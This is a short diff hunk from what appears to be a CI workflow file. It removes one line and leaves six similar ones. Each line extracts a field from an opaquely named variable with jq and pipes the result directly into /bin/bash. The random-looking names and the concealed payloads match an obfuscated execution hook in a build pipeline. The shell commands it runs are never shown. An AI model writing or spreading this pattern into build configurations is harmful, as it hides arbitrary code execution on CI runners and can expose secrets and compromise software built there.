@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$uxoxy19125" | jq -r .dpcia90 | /bin/bash
           echo $knxg61182 | jq -r .glv67262 | /bin/bash
           echo $az7690 | jq -r .uoeh8028 | /bin/bash
-          printf '%s' "$iujbc61" | jq -r .wpv5340 | /bin/bash
           printf '%s' "$cte9224" | jq -r .by831 | /bin/bash
           printf '%s' "$pubf597" | jq -r .w4790 | /bin/bash
           printf '%s' "$dxw6" | jq -r .hchgn108 | /bin/bash
